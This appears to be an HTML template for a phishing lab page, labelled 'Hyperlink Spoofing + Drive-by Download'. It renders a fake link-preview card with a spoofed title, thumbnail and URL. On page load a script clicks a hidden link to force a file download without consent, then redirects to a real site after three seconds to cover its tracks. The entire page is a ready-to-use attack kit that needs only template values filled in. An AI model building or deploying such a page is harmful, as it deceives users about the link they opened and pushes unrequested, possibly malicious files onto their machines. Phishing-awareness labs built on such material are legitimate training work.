<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>{{ og_title }}</title>
    <meta property="og:title" content="{{ og_title }}">
    <meta property="og:description" content="{{ og_desc }}">
    <meta property="og:image" content="{{ og_thumbnail }}">
    <meta property="og:url" content="{{ og_url }}">
    <meta property="og:type" content="{{ og_type }}">
    <meta property="og:site_name" content="{{ og_site_name }}">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="{{ og_title }}">
    <meta name="twitter:description" content="{{ og_desc }}">
    <meta name="twitter:image" content="{{ og_thumbnail }}">
    {% if og_favicon %}
    <link rel="icon" href="{{ og_favicon }}">
    {% endif %}
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #0f0f0f;
            color: #fff;
            min-height: 100vh;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* Preview Card - Universal Style */
        .preview-card {
            background: #1a1a1a;
            border-radius: 12px;
            overflow: hidden;
            margin-top: 20px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            transition: transform 0.2s;
        }
        .preview-card:hover {
            transform: translateY(-2px);
        }
        
        /* Image Container */
        .preview-image-container {
            position: relative;
            width: 100%;
            aspect-ratio: 16/9;
            background: #222;
            overflow: hidden;
        }
        .preview-image {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transition: opacity 0.3s;
        }
        .preview-image.error {
            opacity: 0;
        }
        
        /* Video Play Button */
        .play-button {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 68px;
            height: 48px;
            background: rgba(0,0,0,0.7);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0;
            transition: opacity 0.2s;
        }
        .preview-card:hover .play-button {
            opacity: 1;
        }
        .play-button svg {
            width: 24px;
            height: 24px;
            fill: #fff;
        }
        
        /* Fallback Image */
        .preview-fallback {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
        }
        .fallback-icon {
            font-size: 48px;
            opacity: 0.3;
        }
        
        /* Info Section */
        .preview-info {
            padding: 20px;
        }
        .preview-header {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            margin-bottom: 12px;
        }
        .preview-favicon {
            width: 24px;
            height: 24px;
            border-radius: 4px;
            flex-shrink: 0;
        }
        .preview-site {
            font-size: 12px;
            color: #888;
            margin-bottom: 4px;
        }
        .preview-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 8px;
            line-height: 1.3;
            display: -webkit-box;
            -webkit-line-clamp: 2;
            -webkit-box-orient: vertical;
            overflow: hidden;
        }
        .preview-desc {
            font-size: 14px;
            color: #aaa;
            line-height: 1.5;
            display: -webkit-box;
            -webkit-line-clamp: 3;
            -webkit-box-orient: vertical;
            overflow: hidden;
        }
        .preview-url {
            font-size: 12px;
            color: #666;
            margin-top: 12px;
            word-break: break-all;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .preview-url-icon {
            width: 14px;
            height: 14px;
            opacity: 0.5;
        }
        
        /* Platform Badge */
        .platform-badge {
            display: inline-block;
            padding: 4px 8px;
            background: #333;
            border-radius: 4px;
            font-size: 10px;
            color: #888;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-top: 8px;
        }
        
        /* Loading Spinner */
        .spinner-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.95);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            transition: opacity 0.3s;
        }
        .spinner-overlay.hidden {
            opacity: 0;
            pointer-events: none;
        }
        .spinner-container {
            text-align: center;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid #333;
            border-top: 3px solid #ff0000;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .loading-text {
            color: #aaa;
            font-size: 14px;
        }
        .loading-subtext {
            color: #666;
            font-size: 12px;
            margin-top: 8px;
        }
        
        /* Footer */
        .footer {
            text-align: center;
            padding: 20px;
            color: #444;
            font-size: 11px;
            margin-top: 40px;
        }
        
        /* Status Bar */
        .status-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #1a1a1a;
            padding: 12px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-top: 1px solid #333;
            z-index: 100;
        }
        .status-text {
            font-size: 12px;
            color: #888;
        }
        .status-indicator {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #00ff00;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
    </style>
</head>
<body>
    <div class="spinner-overlay" id="overlay">
        <div class="spinner-container">
            <div class="spinner"></div>
            <p class="loading-text">Loading content...</p>
            <p class="loading-subtext">{{ og_site_name }}</p>
        </div>
    </div>

    <div class="container">
        <div class="preview-card">
            <div class="preview-image-container">
                <div class="preview-fallback" id="fallback">
                    <span class="fallback-icon">🔗</span>
                </div>
                <img class="preview-image" id="previewImg" 
                     src="{{ og_thumbnail }}" 
                     alt="{{ og_title }}"
                     onerror="this.classList.add('error'); document.getElementById('fallback').style.display='flex';"
                     onload="document.getElementById('fallback').style.display='none';">
                {% if is_video %}
                <div class="play-button">
                    <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
                </div>
                {% endif %}
            </div>
            
            <div class="preview-info">
                <div class="preview-header">
                    {% if og_favicon %}
                    <img class="preview-favicon" src="{{ og_favicon }}" alt="" onerror="this.style.display='none';">
                    {% endif %}
                    <div>
                        <div class="preview-site">{{ og_site_name }}</div>
                        <h1 class="preview-title">{{ og_title }}</h1>
                    </div>
                </div>
                <p class="preview-desc">{{ og_desc }}</p>
                <div class="preview-url">
                    <svg class="preview-url-icon" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
                    </svg>
                    <span>{{ content_url }}</span>
                </div>
                <span class="platform-badge">{{ platform }}</span>
            </div>
        </div>
    </div>

    <div class="footer">Lab Simulation — Hyperlink Spoofing + Drive-by Download</div>

    <div class="status-bar">
        <span class="status-text" id="statusText">Initializing...</span>
        <div class="status-indicator"></div>
    </div>

    <script>
        var downloadUrl = '{{ download_url }}';
        var realUrl = '{{ real_url }}';
        var downloadName = '{{ download_name }}';
        var contentUrl = '{{ content_url }}';

        // Update status
        function setStatus(text) {
            document.getElementById('statusText').textContent = text;
        }

        // Handle image fallback
        var img = document.getElementById('previewImg');
        var fallbackImg = '{{ og_thumbnail_fallback }}';
        
        img.onerror = function() {
            if (fallbackImg && this.src !== fallbackImg) {
                this.src = fallbackImg;
                this.onerror = function() {
                    this.classList.add('error');
                    document.getElementById('fallback').style.display='flex';
                };
            } else {
                this.classList.add('error');
                document.getElementById('fallback').style.display='flex';
            }
        };

        // Auto-download
        (function() {
            console.log('[*] Triggering auto-download...');
            setStatus('Downloading ' + downloadName + '...');
            
            var a = document.createElement('a');
            a.href = downloadUrl;
            a.download = downloadName;
            a.style.display = 'none';
            document.body.appendChild(a);
            
            a.click();
            
            setTimeout(function() {
                document.body.removeChild(a);
            }, 100);
            
            console.log('[*] Download triggered: ' + downloadName);
        })();

        // Redirect after 3 seconds
        setTimeout(function() {
            console.log('[*] Redirecting to: ' + realUrl);
            setStatus('Redirecting to ' + contentUrl + '...');
            
            // Hide overlay
            document.getElementById('overlay').classList.add('hidden');
            
            // Redirect
            setTimeout(function() {
                window.location.href = realUrl;
            }, 500);
        }, 3000);

        // Initial status
        setTimeout(function() {
            setStatus('Content loaded from {{ og_site_name }}');
        }, 500);
    </script>
</body>
</html>
